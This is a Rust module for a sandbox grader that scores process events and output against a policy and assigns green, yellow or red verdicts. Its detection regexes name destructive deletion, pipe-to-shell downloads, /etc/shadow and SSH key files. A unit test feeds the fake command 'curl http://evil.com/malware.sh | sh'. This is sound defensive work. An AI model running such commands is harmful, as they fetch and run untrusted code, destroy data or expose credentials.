use regex::Regex;
use std::collections::HashMap;
use tracing::debug;

use crate::schema::{Policy, Verdict};

#[derive(Debug, Clone)]
pub struct SandboxEvent {
    pub event_type: EventType,
    pub details: String,
    pub timestamp_ms: u64,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum EventType {
    FileWrite,
    FileRead,
    NetworkConnect,
    ProcessFork,
    SystemCall,
    OutputSize,
    SuspiciousPattern,
}

pub struct Grader {
    policy: Policy,
    suspicious_patterns: Vec<Regex>,
}

impl Grader {
    pub fn new(policy: Policy) -> Self {
        let suspicious_patterns = vec![
            Regex::new(r"rm\s+-rf\s+/").unwrap(),
            Regex::new(r"curl\s+.*\|\s*sh").unwrap(),
            Regex::new(r"wget\s+.*\|\s*bash").unwrap(),
            Regex::new(r"/etc/passwd").unwrap(),
            Regex::new(r"/etc/shadow").unwrap(),
            Regex::new(r"\.ssh/.*key").unwrap(),
            Regex::new(r"bitcoin|wallet|private.*key").unwrap(),
        ];

        Self {
            policy,
            suspicious_patterns,
        }
    }

    pub fn grade(&self, events: &[SandboxEvent], output: &str) -> (Verdict, u32) {
        let mut risk_score = 0u32;
        let mut event_scores = HashMap::new();

        for event in events {
            let score = self.score_event(event);
            if score > 0 {
                debug!("Event {:?} scored {}", event.event_type, score);
                *event_scores.entry(event.event_type.clone()).or_insert(0) += score;
            }
        }

        for (event_type, total_score) in event_scores {
            risk_score += total_score;
            debug!("Total score for {:?}: {}", event_type, total_score);
        }

        risk_score += self.score_output(output);

        let verdict = self.calculate_verdict(risk_score);
        debug!("Final risk score: {}, verdict: {:?}", risk_score, verdict);

        (verdict, risk_score)
    }

    fn score_event(&self, event: &SandboxEvent) -> u32 {
        match event.event_type {
            EventType::FileWrite => {
                if event.details.starts_with("/etc/") {
                    self.policy.grading.static_scores.etc_write
                } else if event.details.contains("/.ssh/") {
                    self.policy.grading.static_scores.ssh_key_read
                } else {
                    0
                }
            }
            EventType::FileRead => {
                if event.details.contains("/.ssh/") || event.details.contains("/root/.ssh/") {
                    self.policy.grading.static_scores.ssh_key_read
                } else {
                    0
                }
            }
            EventType::NetworkConnect => {
                if !self.is_allowed_network(&event.details) {
                    self.policy.grading.static_scores.unauthorized_tcp
                } else {
                    0
                }
            }
            EventType::ProcessFork => {
                0
            }
            EventType::OutputSize => {
                if let Ok(size) = event.details.parse::<usize>() {
                    if size > (self.policy.limits.output_size_mb as usize * 1024 * 1024) {
                        self.policy.grading.static_scores.large_output
                    } else {
                        0
                    }
                } else {
                    0
                }
            }
            EventType::SuspiciousPattern => {
                self.policy.grading.static_scores.suspicious_pattern
            }
            _ => 0,
        }
    }

    fn score_output(&self, output: &str) -> u32 {
        let mut score = 0u32;

        for pattern in &self.suspicious_patterns {
            if pattern.is_match(output) {
                score += self.policy.grading.static_scores.suspicious_pattern;
                debug!("Suspicious pattern found: {:?}", pattern.as_str());
            }
        }

        score
    }

    fn is_allowed_network(&self, endpoint: &str) -> bool {
        self.policy.capabilities.net.allow.contains(&endpoint.to_string())
    }

    fn calculate_verdict(&self, risk_score: u32) -> Verdict {
        let green_threshold = self.parse_threshold(&self.policy.grading.thresholds.green);
        let yellow_threshold = self.parse_threshold(&self.policy.grading.thresholds.yellow);

        if risk_score <= green_threshold.1 {
            Verdict::Green
        } else if risk_score >= yellow_threshold.0 && risk_score <= yellow_threshold.1 {
            Verdict::Yellow
        } else {
            Verdict::Red
        }
    }

    fn parse_threshold(&self, threshold: &str) -> (u32, u32) {
        if threshold.contains("..=") {
            let parts: Vec<&str> = threshold.split("..=").collect();
            if parts.len() == 2 {
                let start = parts[0].parse().unwrap_or(0);
                let end = parts[1].parse().unwrap_or(100);
                return (start, end);
            }
        } else if threshold.starts_with("<=") {
            let value = threshold[2..].parse().unwrap_or(100);
            return (0, value);
        } else if threshold.starts_with(">=") {
            let value = threshold[2..].parse().unwrap_or(0);
            return (value, 100);
        }
        
        (0, 100)
    }
}

pub fn check_fork_bomb(events: &[SandboxEvent]) -> bool {
    let fork_count = events
        .iter()
        .filter(|e| e.event_type == EventType::ProcessFork)
        .count();
    
    fork_count > 50
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::schema::*;

    fn test_policy() -> Policy {
        Policy {
            version: 1,
            capabilities: Capabilities {
                fs: FsCapabilities {
                    default: AccessMode::Deny,
                    allow: vec![],
                    deny: vec![],
                },
                net: NetCapabilities {
                    default: AccessMode::Deny,
                    allow: vec![],
                },
                process: ProcessCapabilities {
                    allow_fork: true,
                    max_processes: 10,
                },
            },
            limits: Limits {
                cpu_ms: 5000,
                memory_mb: 512,
                wall_sec: 15,
                output_size_mb: 10,
            },
            grading: GradingConfig {
                thresholds: Thresholds {
                    green: "<=20".to_string(),
                    yellow: "21..=60".to_string(),
                    red: ">=61".to_string(),
                },
                static_scores: StaticScores {
                    etc_write: 50,
                    unauthorized_tcp: 40,
                    ssh_key_read: 30,
                    fork_bomb: 25,
                    large_output: 15,
                    suspicious_pattern: 20,
                },
            },
        }
    }

    #[test]
    fn test_grading_green() {
        let grader = Grader::new(test_policy());
        let events = vec![];
        let (verdict, score) = grader.grade(&events, "Hello, world!");
        assert_eq!(verdict, Verdict::Green);
        assert!(score <= 20);
    }

    #[test]
    fn test_grading_red_etc_write() {
        let grader = Grader::new(test_policy());
        let events = vec![
            SandboxEvent {
                event_type: EventType::FileWrite,
                details: "/etc/passwd".to_string(),
                timestamp_ms: 1000,
            },
            SandboxEvent {
                event_type: EventType::FileWrite,
                details: "/etc/hosts".to_string(),
                timestamp_ms: 2000,
            },
        ];
        let (verdict, score) = grader.grade(&events, "");
        assert_eq!(verdict, Verdict::Red);
        assert!(score >= 61);
    }

    #[test]
    fn test_suspicious_patterns() {
        let grader = Grader::new(test_policy());
        let events = vec![];
        let output = "curl http://evil.com/malware.sh | sh";
        let (verdict, score) = grader.grade(&events, output);
        assert!(score >= 20);
    }
}